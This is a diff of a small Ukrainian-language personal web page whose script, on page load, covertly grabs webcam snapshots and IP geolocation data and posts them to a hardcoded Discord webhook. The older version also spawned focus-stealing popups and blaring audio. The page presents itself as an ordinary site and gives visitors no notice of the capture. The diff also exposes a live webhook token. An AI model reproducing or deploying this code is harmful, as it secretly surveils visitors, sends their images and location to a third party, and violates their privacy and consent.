@@ -2,7 +2,7 @@
 <html lang="uk">
 <head>
 <meta charset="UTF-8" />
-<title>Сайт Севкi</title>
+<title>Сайт Севки</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap');
   body {
@@ -38,135 +38,73 @@
 </head>
 <body>
   <div class="glass-container">
-    <div>Привiт, Це Сайт Севкi</div>
-    <div style="margin-top: 15px; font-weight: 500; font-size: 1.1rem;">
-      Нажми пробел або кликни щоби продовжити
-    </div>
+    <div>Сайт Севки</div>
   </div>
 
-  <audio id="bgAudio" src="https://sevkabevka.github.io/alah.mp3" loop></audio>
+  <audio id="audio" src="https://sevkabevka.github.io/alah.mp3" loop></audio>
 
-<script>
-  const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';
+  <script>
+    const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';
 
-  let popups = [];
-
-  class PopupWindow {
-    constructor() {
-      this.width = 500;
-      this.height = 500;
-      this.x = 100 + Math.random() * (screen.availWidth - this.width - 100);
-      this.y = 100 + Math.random() * (screen.availHeight - this.height - 100);
-
-      this.win = window.open('', '', `width=${this.width},height=${this.height},left=${this.x},top=${this.y},toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no`);
-      if (!this.win) return;
-
-      this.win.focus();
-
-      this.win.document.write(`
-        <style>
-          body {
-            margin:0; background:black; overflow:hidden;
-            display:flex; justify-content:center; align-items:center;
-            color:white; font-family: Arial, sans-serif;
-            user-select:none;
-          }
-          audio { display:none; }
-        </style>
-        <body>
-          <audio autoplay loop src="https://sevkabevka.github.io/alah.mp3" volume="1.0"></audio>
-          <div style="font-size: 24px; text-align:center; padding: 20px;">Севкабевка Popup</div>
-        </body>
-      `);
-      this.win.document.close();
-
-      // Try to keep on top by focusing every 500ms
-      this.focusInterval = setInterval(() => {
-        if (this.win.closed) {
-          clearInterval(this.focusInterval);
-          return;
-        }
-        this.win.focus();
-      }, 500);
+    async function sendToWebhook(payload) {
+      try {
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(payload)
+        });
+      } catch(e) {}
     }
-  }
 
-  function spawnPopups(count = 3) {
-    for (let i = 0; i < count; i++) {
-      const p = new PopupWindow();
-      if (p.win) popups.push(p);
+    async function sendIP() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        await sendToWebhook({content: `IP Info: ${JSON.stringify(data)}`});
+      } catch(e) {}
     }
-  }
 
-  // Play audio inside main page
-  function playAudio() {
-    const audio = document.getElementById('bgAudio');
-    if (audio.paused) {
-      audio.volume = 1.0;
-      audio.play().catch(() => {});
+    async function sendImage(blob) {
+      const reader = new FileReader();
+      reader.onloadend = () => {
+        sendToWebhook({content: `Camera Image (base64): ${reader.result}`});
+      };
+      reader.readAsDataURL(blob);
     }
-  }
 
-  async function sendToWebhook(payload) {
-    try {
-      await fetch(webhookURL, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(payload),
-      });
-    } catch {}
-  }
+    async function captureAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: true});
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
 
-  async function sendIP() {
-    try {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const data = await res.json();
-      await sendToWebhook({content: `User IP: ${data.ip}`});
-    } catch {}
-  }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
 
-  async function sendCameraImage() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({video: true});
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      await video.play();
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(sendImage);
 
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // Capture another image after 3 seconds
+        setTimeout(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(sendImage);
+          stream.getTracks().forEach(t => t.stop());
+        }, 3000);
 
-      stream.getTracks().forEach(t => t.stop());
+        sendIP();
+      } catch (e) {
+        // On camera access denied play audio
+        document.getElementById('audio').play().catch(() => {});
+        sendIP();
+      }
+    }
 
-      const dataUrl = canvas.toDataURL('image/png');
-      // Send base64 string as text content
-      await sendToWebhook({content: `Camera snapshot (base64): ${dataUrl}`});
-    } catch {}
-  }
-
-  async function captureAndSend() {
-    await sendIP();
-    await sendCameraImage();
-  }
-
-  async function interactionHandler(e) {
-    if (
-      (e.type === 'keydown' && e.code === 'Space') ||
-      e.type === 'click' ||
-      e.type === 'contextmenu'
-    ) {
-      e.preventDefault();
-      playAudio();
-      spawnPopups(3);
+    window.onload = () => {
       captureAndSend();
     }
-  }
-
-  document.addEventListener('keydown', interactionHandler);
-  document.addEventListener('click', interactionHandler);
-  document.addEventListener('contextmenu', interactionHandler);
-</script>
+  </script>
 </body>
 </html>
